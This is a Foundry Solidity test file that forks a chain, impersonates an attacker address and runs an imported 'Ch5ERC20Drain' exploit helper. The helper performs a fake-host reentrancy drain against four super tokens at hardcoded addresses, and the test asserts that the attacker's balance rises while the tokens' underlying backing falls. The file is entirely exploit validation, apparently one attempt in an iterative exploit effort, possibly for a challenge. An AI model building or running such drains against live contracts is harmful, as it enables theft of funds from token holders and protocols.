// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5ERC20Drain, ISuperToken, IERC20Minimal} from "../exploit/Run.s.sol";

/// @notice Exact current-head validation for the quoted dust continuation
///         helper path added to `Ch5ERC20Drain`. Each token gets a fresh helper
///         and a 250 MATIC stage cap; the helper computes the smaller live
///         bootstrap it actually needs on-chain before executing the fake-host
///         reentry round.
contract Attempt55CurrentHeadQuotedDustContinuationTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;

    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant ETHX = 0x27e1e4E6BC79D93032abef01025811B7E4727e85;
    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;

    uint256 internal constant STAGE_CAP = 250 ether;
    uint256 internal constant MAX_REENTRY_COUNT = 20;

    uint32 internal constant USDC_INDEX_BASE = 720_000_000;
    uint32 internal constant DAI_INDEX_BASE = 730_000_000;
    uint32 internal constant ETH_INDEX_BASE = 735_000_000;
    uint32 internal constant WBTC_INDEX_BASE = 740_000_000;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_current_head_quoted_dust_path_increases_native_balance() public {
        uint256 nativeBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        _drainQuotedDust("USDCx", USDCX, USDC_INDEX_BASE);
        _drainQuotedDust("DAIx", DAIX, DAI_INDEX_BASE);
        _drainQuotedDust("ETHx", ETHX, ETH_INDEX_BASE);
        _drainQuotedDust("WBTCx", WBTCX, WBTC_INDEX_BASE);
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "quoted dust continuation should increase native balance");
    }

    function _drainQuotedDust(string memory label, address superToken, uint32 indexBase) internal {
        address underlying = ISuperToken(superToken).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20Minimal(underlying).balanceOf(superToken);
        if (backingBefore <= 1) {
            console.log(label);
            console.log("backing already empty, skipping");
            return;
        }

        console.log(label);
        console.log("attacker native before token:", nativeBefore);
        console.log("underlying backing before:", backingBefore);

        Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
        (uint256 bootstrapNative, uint256 roundsExecuted, uint256 nativeOut) =
            drain.executeQuotedDust{value: STAGE_CAP}(MAX_REENTRY_COUNT);

        uint256 nativeAfter = ATTACKER.balance;
        uint256 backingAfter = IERC20Minimal(underlying).balanceOf(superToken);

        console.log("bootstrap native:", bootstrapNative);
        console.log("rounds executed:", roundsExecuted);
        console.log("helper native out:", nativeOut);
        console.log("token native delta:", nativeAfter - nativeBefore);
        console.log("underlying backing after:", backingAfter);

        assertGt(roundsExecuted, 0, "no rounds executed");
        assertGt(nativeAfter, nativeBefore, "quoted dust stage was not profitable");
        assertLt(backingAfter, backingBefore, "token backing unchanged");
    }
}
